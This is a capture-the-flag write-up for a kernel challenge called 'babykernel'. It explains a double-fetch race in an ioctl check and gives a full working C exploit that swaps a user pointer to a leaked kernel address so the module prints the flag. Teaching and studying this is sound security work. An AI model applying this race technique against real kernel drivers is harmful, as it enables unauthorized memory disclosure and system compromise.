# babykernel

*double fetch	race without uffd*



## Vulnerability

​	It is a classic double fetch vulnerability. 

​	The flag string lies in the kernel space memory, and the kernel module will give you its address by `cmd=26214`. By `cmd=0x1337` the kernel module first checked the legality of the user pointer, then compared its content with the flag string in kernel memory. If matches, the module will print the flag string.

<img src="pic/2021-11-05 20-15-05 的屏幕截图.png" alt="2021-11-05 20-15-05 的屏幕截图" style="zoom:50%;" />

​	The legality check includes:

1. the string length pointed by the user pointer should have the same length as the flag string.
2. the user pointer should pointer to user space.
3. the string pointed by the user pointer should fully lies in user space.



​	So we need to find a way to let the kernel print the flag string, which means we need to pass the the several check and then make the value of  the user pointer equals the address of the flag string inside the kernel space memory. We will achieve this by race.



## Exploit

from the top level we:

1. issue an ioctl with `cmd=26214` to get the address of the flag string in the kernel space memory
2. start a thread, which keep issuing ioctl with `cmd=0x1337` with a legal pointer which will pass the legality check
3. start another thread at the same time, which keep changing the legal pointer value to the address of the flag string in the kernel space memory, which will make the comparing between the user pointer with the flag string return true, resulting the module printing the flag string



### implementation

​	Too trivial to explain

```c
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <pthread.h>

#define MAXTRY 0x10000

int fd;
unsigned long flag_addr = 0;
void get_flag_addr(int fd){
    ioctl(fd, 26214);
    system("dmesg > /tmp/dmesg");
    int fd_dmesg = open("/tmp/dmesg", O_RDONLY);
    if(!fd_dmesg){
        puts("[-] failed open /tmp/dmesg");
        exit(0);
    }
    lseek(fd_dmesg, -200, SEEK_END);
    char buf[300] = {0};
    read(fd_dmesg, buf, 200);
    char *p = strstr(buf, "Your flag is at ");
    if(p){
        p+=16;
        flag_addr = strtoull(p, &p, 16);
        printf("[+] flag load at %lx\n", flag_addr);
    }else{
        puts("[-] failed when searching flag addr");
    }
    close(fd_dmesg);
}

struct info{
    char *s;
    unsigned long len;
};


struct info info;
int finish=0;

void* evil(){
    while(!finish){
        info.s = (char*)flag_addr;
    }    
}


int main(){
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0); 
    fd = open("/dev/baby", O_RDWR);
    get_flag_addr(fd);
    
    char dummy[10] = {0};
    info.s = dummy;
    info.len = 33;

    pthread_t t;
    pthread_create(&t, NULL, evil, NULL);
    for(int i=0;i<MAXTRY;i++){
        info.s = dummy;
        ioctl(fd, 0x1337, &info);
    }
    finish = 1;
    pthread_join(t, NULL);
    system("dmesg | grep flag");
    close(fd);
    return 0;
}
```



### someting to mention

​	The legality check to the user space pointer is implemented like

<img src="pic/2021-11-05 20-35-17 的屏幕截图.png" alt="2021-11-05 20-35-17 的屏幕截图" style="zoom:50%;" />



​	The `current_task+0x1358` stores the address of the last page of user space memory

